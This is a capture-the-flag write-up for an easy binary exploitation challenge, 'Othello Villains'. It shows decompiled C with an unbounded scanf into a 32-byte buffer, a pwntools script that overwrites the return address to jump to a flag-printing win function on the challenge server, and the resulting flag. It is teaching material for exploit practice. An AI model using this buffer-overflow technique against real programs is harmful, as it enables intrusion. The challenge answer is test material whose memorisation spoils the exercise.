# Othello Villains

```
Difficulty: Easy
Author: olexmeister

The Othello villains stole our sacred Brunner recipe! Luckily, they are unable to write secure code, please retrieve the recipe from their (in)secure vault!

This challenge is a good next step after solving beginner challenge Dat Overflow Dough!
```

Decompiled code:

```c

undefined8 main(void)

{
  undefined1 local_28 [32];
  
  puts("Othello villains secret server. Do you know the password??\n");
  fflush(stdout);
  __isoc99_scanf("%s",local_28);
  return 0;
}


void win(void)

{
  char local_118 [256];
  size_t local_18;
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    puts("Could not open flag file, please contact admin!");
    FUN_00401100(1);
  }
  local_18 = fread(local_118,1,0x100,local_10);
  puts(local_118);
  return;
}
```

Override return address to `win`. Reuse the attack script from `Dat Overflow Dough`:

```python
from pwn import *

# Dear intern, try to put in the correct values for the following variables
# This will show you why your current C-code could leak our secret dough recipe!
RECIPE_BUFFER_SIZE = 32
RBP_SIZE = 8
SECRET_ADDRESS = 0x4012ae
PROMPT = "password??"

USE_REMOTE = True
REMOTE_HOST = "othello-villains-86f3a69b9fbeb4af.challs.brunnerne.xyz"
REMOTE_PORT = 443

"""
This is a pwntools template - you do not have to change anything below this
Install pwntools before running:
    python3 -m pip install pwntools

(if you get an error about the environment being externally managed, add --break-system-packages to the command)
"""
if USE_REMOTE:
    io = remote(REMOTE_HOST, REMOTE_PORT, ssl=True)
else:
    e = ELF("./othelloserver")
    io = e.process()

# Building the payload
payload = b"A" * RECIPE_BUFFER_SIZE
payload += b"B" * RBP_SIZE
payload += p64(SECRET_ADDRESS)

# Sending the payload at the right time
io.recvuntil(PROMPT.encode())
io.sendline(payload)
io.interactive()
```

Get flag: `brunner{0th3ll0_is_inf3ri0r_t0_brunn3r}`
